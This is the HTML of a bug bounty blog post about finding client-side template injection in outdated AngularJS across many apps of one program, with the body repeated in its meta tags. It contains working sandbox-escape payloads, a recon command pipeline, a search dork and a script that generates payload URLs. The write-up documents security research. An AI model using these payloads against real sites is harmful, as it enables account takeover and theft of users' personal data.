<!DOCTYPE html>
<html lang="en">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>XSS At Scale -- Finding and exploiting a program-wide CSTI</title><!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="XSS At Scale – Finding and exploiting a program-wide CSTI" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="XSS At Scale – Finding and exploiting a program-wide CSTI. Recently I’ve been re-visiting a program that I’ve previously spent a lot of time on. After finding and reporting a number of vulnerabilities over the course of a few months I still wasn’t completely satisfied with the bugs I had found up to that point, and wanted to dig deeper to uncover some more interesting findings. In the early stages of testing I had noticed that an alarming amount of their applications were running outdated versions of AngularJS. This is already a red flag considering AngularJS hasn’t been supported for a little under 3 years at the time I’m writing this. The one caveat is that a decent number of these domains were largely unauthenticated static sites with no sensitive actions. The ones that did contain such functionality were interesting as they would give an attacker access to some critical information about a victim (Full Name, Address, Email, Genealogy information, Phoner number, and more.) These domains also included messaging functionality that allows its users to communicate. With this information in mind the goal was set to find a CSTI in the application as this could surely be used leak a users PII and the messaging functionality can be leveraged to make the XSS wormable, opening up the possibility to scale the vulnerability across the entire user-base. AngularJS expression syntax is relatively simple, and can be thought of as a JavaScript-like expression (with a few differences that aren’t relevant here) wrapped in two curly brackets: {{1+1}} The main difference that’s important to keep in mind is that AngularJS expressions evaluate within a restricted execution context and each carry their own scope. On the other hand, JavaScript expressions evaluate within the global execution context. This means that the global functions and APIs needed to build a working proof of concept won’t be available in the context of an AngularJS expression. However, constructor chaining can be used to gain a reference to window: {{constructor.constructor(&#39;alert&#39;)()}} I used the command below to get a list of domains using AngularJS and piped them into gau in the hopes of finding a large number of paths/parameters to test further: cat urls.txt | httpx -tech-detect -silent -no-color | grep AngularJS | grep -oE &#39;http[s]?://[^ ]+&#39; | gau | tee --append urls.txt When testing for template injection the easiest way to confirm that expressions are being evaluated is to supply a basic math expression to any inputs, followed by searching the page for the evaluation. For example, supplying {{191*7}} in any parameters and searching for the number 1337 within the page. It wasn’t long before I found a parameter that was evaluating input and reflecting it in an SEO tag in the head of the page. AngularJS uses context-aware encoding by default, but luckily the work-around for this is relatively trivial. By using constructor chaining again within the function body it’s possible to gain a reference to the String object in order to use string operations like fromCharCode: {{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}} The domain I found the first issue in was a static site with almost no dynamic content and no authenticated actions, so I decided to move on and continue looking in other places. It wasn’t long after the first finding that I noticed the same parameter and issue was present in several other domains. With the assumption in mind that these applications were likely using a shared code-base I decided to write a quick google dork in order to get an idea of how many domains have this same issue: site:*.target.com inurl:parameter=defaultvalue All-in-all I identified that the issue was present in over 60 apps. In 3 of them I was able to leak PII to my origin and in 2 take over a users account with relative ease. In the one with messaging functionality I was able to build a wormable (my first ever!) proof of concept that in an attackers hands would have allowed them to exfiltrate PII at scale. Below you’ll find a quick script I hacked together to generate vulnerable URLs that pop an alert when visited: constpayload = &quot;alert(1)&quot;; function buildPayload(payloadString) { let charArray = []; for (let i = 0; i &lt; payloadString.length; i++) { charArray.push(payloadString.charCodeAt(i)); } return `{{constructor.constructor(valueOf.name.constructor.fromCharCode(${charArray.toString()}))()}}`; } function getDomains(vulnerableDomains) { let linkContainer = document.querySelector(&#39;.links&#39;); for (let domain of vulnerableDomains) { let anchor = document.createElement(&#39;a&#39;); let withExpression = `${domain}${buildPayload(payload)}`; anchor.setAttribute(&#39;href&#39;, withExpression); anchor.setAttribute(&#39;target&#39;, &quot;_blank&quot;); anchor.style.display = &#39;block&#39;; anchor.innerText = withExpression; linkContainer.appendChild(anchor); } } getDomains([&quot;https://target.com/test?parameter=&quot;, &quot;https://other.target.com/test?parameter=&quot;, &quot;https://third.target.com/test?parameter=&quot;]);" />
<meta property="og:description" content="XSS At Scale – Finding and exploiting a program-wide CSTI. Recently I’ve been re-visiting a program that I’ve previously spent a lot of time on. After finding and reporting a number of vulnerabilities over the course of a few months I still wasn’t completely satisfied with the bugs I had found up to that point, and wanted to dig deeper to uncover some more interesting findings. In the early stages of testing I had noticed that an alarming amount of their applications were running outdated versions of AngularJS. This is already a red flag considering AngularJS hasn’t been supported for a little under 3 years at the time I’m writing this. The one caveat is that a decent number of these domains were largely unauthenticated static sites with no sensitive actions. The ones that did contain such functionality were interesting as they would give an attacker access to some critical information about a victim (Full Name, Address, Email, Genealogy information, Phoner number, and more.) These domains also included messaging functionality that allows its users to communicate. With this information in mind the goal was set to find a CSTI in the application as this could surely be used leak a users PII and the messaging functionality can be leveraged to make the XSS wormable, opening up the possibility to scale the vulnerability across the entire user-base. AngularJS expression syntax is relatively simple, and can be thought of as a JavaScript-like expression (with a few differences that aren’t relevant here) wrapped in two curly brackets: {{1+1}} The main difference that’s important to keep in mind is that AngularJS expressions evaluate within a restricted execution context and each carry their own scope. On the other hand, JavaScript expressions evaluate within the global execution context. This means that the global functions and APIs needed to build a working proof of concept won’t be available in the context of an AngularJS expression. However, constructor chaining can be used to gain a reference to window: {{constructor.constructor(&#39;alert&#39;)()}} I used the command below to get a list of domains using AngularJS and piped them into gau in the hopes of finding a large number of paths/parameters to test further: cat urls.txt | httpx -tech-detect -silent -no-color | grep AngularJS | grep -oE &#39;http[s]?://[^ ]+&#39; | gau | tee --append urls.txt When testing for template injection the easiest way to confirm that expressions are being evaluated is to supply a basic math expression to any inputs, followed by searching the page for the evaluation. For example, supplying {{191*7}} in any parameters and searching for the number 1337 within the page. It wasn’t long before I found a parameter that was evaluating input and reflecting it in an SEO tag in the head of the page. AngularJS uses context-aware encoding by default, but luckily the work-around for this is relatively trivial. By using constructor chaining again within the function body it’s possible to gain a reference to the String object in order to use string operations like fromCharCode: {{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}} The domain I found the first issue in was a static site with almost no dynamic content and no authenticated actions, so I decided to move on and continue looking in other places. It wasn’t long after the first finding that I noticed the same parameter and issue was present in several other domains. With the assumption in mind that these applications were likely using a shared code-base I decided to write a quick google dork in order to get an idea of how many domains have this same issue: site:*.target.com inurl:parameter=defaultvalue All-in-all I identified that the issue was present in over 60 apps. In 3 of them I was able to leak PII to my origin and in 2 take over a users account with relative ease. In the one with messaging functionality I was able to build a wormable (my first ever!) proof of concept that in an attackers hands would have allowed them to exfiltrate PII at scale. Below you’ll find a quick script I hacked together to generate vulnerable URLs that pop an alert when visited: constpayload = &quot;alert(1)&quot;; function buildPayload(payloadString) { let charArray = []; for (let i = 0; i &lt; payloadString.length; i++) { charArray.push(payloadString.charCodeAt(i)); } return `{{constructor.constructor(valueOf.name.constructor.fromCharCode(${charArray.toString()}))()}}`; } function getDomains(vulnerableDomains) { let linkContainer = document.querySelector(&#39;.links&#39;); for (let domain of vulnerableDomains) { let anchor = document.createElement(&#39;a&#39;); let withExpression = `${domain}${buildPayload(payload)}`; anchor.setAttribute(&#39;href&#39;, withExpression); anchor.setAttribute(&#39;target&#39;, &quot;_blank&quot;); anchor.style.display = &#39;block&#39;; anchor.innerText = withExpression; linkContainer.appendChild(anchor); } } getDomains([&quot;https://target.com/test?parameter=&quot;, &quot;https://other.target.com/test?parameter=&quot;, &quot;https://third.target.com/test?parameter=&quot;]);" />
<link rel="canonical" href="scriptsrcscore.github.io/xss-at-scale" />
<meta property="og:url" content="scriptsrcscore.github.io/xss-at-scale" />
<meta property="og:site_name" content="scriptsrc score!" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-09-02T00:00:00-04:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="XSS At Scale – Finding and exploiting a program-wide CSTI" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-02T00:00:00-04:00","datePublished":"2024-09-02T00:00:00-04:00","description":"XSS At Scale – Finding and exploiting a program-wide CSTI. Recently I’ve been re-visiting a program that I’ve previously spent a lot of time on. After finding and reporting a number of vulnerabilities over the course of a few months I still wasn’t completely satisfied with the bugs I had found up to that point, and wanted to dig deeper to uncover some more interesting findings. In the early stages of testing I had noticed that an alarming amount of their applications were running outdated versions of AngularJS. This is already a red flag considering AngularJS hasn’t been supported for a little under 3 years at the time I’m writing this. The one caveat is that a decent number of these domains were largely unauthenticated static sites with no sensitive actions. The ones that did contain such functionality were interesting as they would give an attacker access to some critical information about a victim (Full Name, Address, Email, Genealogy information, Phoner number, and more.) These domains also included messaging functionality that allows its users to communicate. With this information in mind the goal was set to find a CSTI in the application as this could surely be used leak a users PII and the messaging functionality can be leveraged to make the XSS wormable, opening up the possibility to scale the vulnerability across the entire user-base. AngularJS expression syntax is relatively simple, and can be thought of as a JavaScript-like expression (with a few differences that aren’t relevant here) wrapped in two curly brackets: {{1+1}} The main difference that’s important to keep in mind is that AngularJS expressions evaluate within a restricted execution context and each carry their own scope. On the other hand, JavaScript expressions evaluate within the global execution context. This means that the global functions and APIs needed to build a working proof of concept won’t be available in the context of an AngularJS expression. However, constructor chaining can be used to gain a reference to window: {{constructor.constructor(&#39;alert&#39;)()}} I used the command below to get a list of domains using AngularJS and piped them into gau in the hopes of finding a large number of paths/parameters to test further: cat urls.txt | httpx -tech-detect -silent -no-color | grep AngularJS | grep -oE &#39;http[s]?://[^ ]+&#39; | gau | tee --append urls.txt When testing for template injection the easiest way to confirm that expressions are being evaluated is to supply a basic math expression to any inputs, followed by searching the page for the evaluation. For example, supplying {{191*7}} in any parameters and searching for the number 1337 within the page. It wasn’t long before I found a parameter that was evaluating input and reflecting it in an SEO tag in the head of the page. AngularJS uses context-aware encoding by default, but luckily the work-around for this is relatively trivial. By using constructor chaining again within the function body it’s possible to gain a reference to the String object in order to use string operations like fromCharCode: {{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}} The domain I found the first issue in was a static site with almost no dynamic content and no authenticated actions, so I decided to move on and continue looking in other places. It wasn’t long after the first finding that I noticed the same parameter and issue was present in several other domains. With the assumption in mind that these applications were likely using a shared code-base I decided to write a quick google dork in order to get an idea of how many domains have this same issue: site:*.target.com inurl:parameter=defaultvalue All-in-all I identified that the issue was present in over 60 apps. In 3 of them I was able to leak PII to my origin and in 2 take over a users account with relative ease. In the one with messaging functionality I was able to build a wormable (my first ever!) proof of concept that in an attackers hands would have allowed them to exfiltrate PII at scale. Below you’ll find a quick script I hacked together to generate vulnerable URLs that pop an alert when visited: constpayload = &quot;alert(1)&quot;; function buildPayload(payloadString) { let charArray = []; for (let i = 0; i &lt; payloadString.length; i++) { charArray.push(payloadString.charCodeAt(i)); } return `{{constructor.constructor(valueOf.name.constructor.fromCharCode(${charArray.toString()}))()}}`; } function getDomains(vulnerableDomains) { let linkContainer = document.querySelector(&#39;.links&#39;); for (let domain of vulnerableDomains) { let anchor = document.createElement(&#39;a&#39;); let withExpression = `${domain}${buildPayload(payload)}`; anchor.setAttribute(&#39;href&#39;, withExpression); anchor.setAttribute(&#39;target&#39;, &quot;_blank&quot;); anchor.style.display = &#39;block&#39;; anchor.innerText = withExpression; linkContainer.appendChild(anchor); } } getDomains([&quot;https://target.com/test?parameter=&quot;, &quot;https://other.target.com/test?parameter=&quot;, &quot;https://third.target.com/test?parameter=&quot;]);","headline":"XSS At Scale – Finding and exploiting a program-wide CSTI","mainEntityOfPage":{"@type":"WebPage","@id":"scriptsrcscore.github.io/xss-at-scale"},"url":"scriptsrcscore.github.io/xss-at-scale"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
<body>
    <div class="container"><header>
  <div class="menu">
    <ul><li><a href="/">/</a></li></ul>
  </div>
</header>
<main>
      <h1 id="xss-at-scale--finding-and-exploiting-a-program-wide-csti">XSS At Scale – Finding and exploiting a program-wide CSTI.</h1>
<p><br />
Recently I’ve been re-visiting a program that I’ve previously spent a lot of time on. After finding and reporting a number of vulnerabilities over the course of a few months I still wasn’t completely satisfied with the bugs I had found up to that point, and wanted to dig deeper to uncover some more interesting findings.</p>

<p>In the early stages of testing I had noticed that an alarming amount of their applications were running outdated versions of AngularJS. This is already a red flag considering AngularJS hasn’t been supported for a little under 3 years at the time I’m writing this. The one caveat is that a decent number of these domains were largely unauthenticated static sites with no sensitive actions. The ones that did contain such functionality were interesting as they would give an attacker access to some critical information about a victim (Full Name, Address, Email, Genealogy information, Phoner number, and more.) These domains also included messaging functionality that allows its users to communicate.</p>

<p>With this information in mind the goal was set to find a CSTI in the application as this could surely be used leak a users PII and the messaging functionality can be leveraged to make the XSS wormable, opening up the possibility to scale the vulnerability across the entire user-base.</p>

<p>AngularJS expression syntax is relatively simple, and can be thought of as a JavaScript-like expression (with a few differences that aren’t relevant here) wrapped in two curly brackets:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="mi">1</span><span class="o">+</span><span class="mi">1</span><span class="p">}}</span>
</code></pre></div></div>
<p><br />
The main difference that’s important to keep in mind is that AngularJS expressions evaluate within a restricted execution context and each carry their own <strong>scope</strong>. On the other hand, JavaScript expressions evaluate within the global execution context. This means that the global functions and APIs needed to build a working proof of concept won’t be available in the context of an AngularJS expression. However, constructor chaining can be used to gain a reference to window:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="kd">constructor</span><span class="p">.</span><span class="nf">constructor</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert</span><span class="dl">'</span><span class="p">)()}}</span>
</code></pre></div></div>
<p><br />
I used the command below to get a list of domains using AngularJS and piped them into gau in the hopes of finding a large number of paths/parameters to test further:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>urls.txt | httpx <span class="nt">-tech-detect</span> <span class="nt">-silent</span> <span class="nt">-no-color</span> | <span class="nb">grep </span>AngularJS | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s1">'http[s]?://[^ ]+'</span> | gau | <span class="nb">tee</span> <span class="nt">--append</span> urls.txt

</code></pre></div></div>
<p><br />
When testing for template injection the easiest way to confirm that expressions are being evaluated is to supply a basic math expression to any inputs, followed by searching the page for the evaluation. For example, supplying <code class="language-plaintext highlighter-rouge">{{191*7}}</code> in any parameters and searching for the number <strong>1337</strong> within the page.</p>

<p>It wasn’t long before I found a parameter that was evaluating input and reflecting it in an SEO tag in the head of the page. AngularJS uses context-aware encoding by default, but luckily the work-around for this is relatively trivial. By using constructor chaining again within the function body it’s possible to gain a reference to the <strong>String</strong> object in order to use string operations like <strong>fromCharCode</strong>:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="kd">constructor</span><span class="p">.</span><span class="nf">constructor</span><span class="p">(</span><span class="nx">valueOf</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">10</span><span class="p">))()}}</span>

</code></pre></div></div>
<p><br />
The domain I found the first issue in was a static site with almost no dynamic content and no authenticated actions, so I decided to move on and continue looking in other places. It wasn’t long after the first finding that I noticed the same parameter and issue was present in several other domains. With the assumption in mind that these applications were likely using a shared code-base I decided to write a quick google dork in order to get an idea of how many domains have this same issue:</p>
<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">site:*.target.com inurl:parameter=defaultvalue</span>
</code></pre></div></div>
<p><br />
All-in-all I identified that the issue was present in over <strong>60</strong> apps. In 3 of them I was able to leak PII to my origin and in 2 take over a users account with relative ease. In the one with messaging functionality I was able to build a wormable (my first ever!) proof of concept that in an attackers hands would have allowed them to exfiltrate PII at scale. Below you’ll find a quick script I hacked together to generate vulnerable URLs that pop an alert when visited:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">constpayload</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">alert(1)</span><span class="dl">"</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">buildPayload</span><span class="p">(</span><span class="nx">payloadString</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">charArray</span> <span class="o">=</span> <span class="p">[];</span>
  <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">payloadString</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">charArray</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">payloadString</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="s2">`{{constructor.constructor(valueOf.name.constructor.fromCharCode(</span><span class="p">${</span><span class="nx">charArray</span><span class="p">.</span><span class="nf">toString</span><span class="p">()}</span><span class="s2">))()}}`</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">getDomains</span><span class="p">(</span><span class="nx">vulnerableDomains</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">linkContainer</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">.links</span><span class="dl">'</span><span class="p">);</span>

  <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">domain</span> <span class="k">of</span> <span class="nx">vulnerableDomains</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">anchor</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">withExpression</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">domain</span><span class="p">}${</span><span class="nf">buildPayload</span><span class="p">(</span><span class="nx">payload</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>

    <span class="nx">anchor</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">href</span><span class="dl">'</span><span class="p">,</span> <span class="nx">withExpression</span><span class="p">);</span>
    <span class="nx">anchor</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">target</span><span class="dl">'</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">anchor</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">block</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">anchor</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">withExpression</span><span class="p">;</span>

    <span class="nx">linkContainer</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">anchor</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nf">getDomains</span><span class="p">([</span><span class="dl">"</span><span class="s2">https://target.com/test?parameter=</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://other.target.com/test?parameter=</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://third.target.com/test?parameter=</span><span class="dl">"</span><span class="p">]);</span>

</code></pre></div></div>



    </main><footer>
  follow me on <a href="https://twitter.com/scriptsrcscore">twitter</a>
</footer>
</div>
  </body>
</html>
